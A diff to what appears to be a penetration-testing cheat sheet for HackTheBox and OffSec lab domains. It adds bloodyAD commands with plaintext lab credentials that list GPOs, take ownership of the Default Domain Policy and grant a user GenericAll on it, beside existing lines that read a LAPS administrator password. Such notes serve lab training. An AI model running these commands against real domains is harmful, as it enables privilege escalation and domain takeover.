@@ -3417,6 +3417,15 @@ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb ad
 # sam can read the LAPS password from the ms-MCS-AdmPwd property  ( sam need have   ReadLAPSPassword permission) 
 bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb get object 'DC$' --attr ms-mcs-AdmPwd
 
+# List their GPOs and CNs.
+bloodyAD -u 'anirudh' -p 'SecureHM' -d 'vault.offsec' --host 192.168.227.172 get search --base "CN=Policies,CN=System,DC=vault,DC=offsec" --filter "(objectClass=groupPolicyContainer)" --attr displayName
+
+# Take Owner of Default Domain Policy (need priv WriteOwner with DEFAULT DOMAIN POLICY GPO)
+bloodyAD -u 'anirudh' -p 'SecureHM' -d 'vault.offsec' --host 192.168.227.172 set owner "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec" "anirudh"
+
+# Add GenericAll privileges to the anirudh account on this object.
+bloodyAD -u 'anirudh' -p 'SecureHM' -d 'vault.offsec' --host 192.168.227.172 add genericAll "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec" "anirudh"
+
 ```
 ## pygpoabuse 
 ```
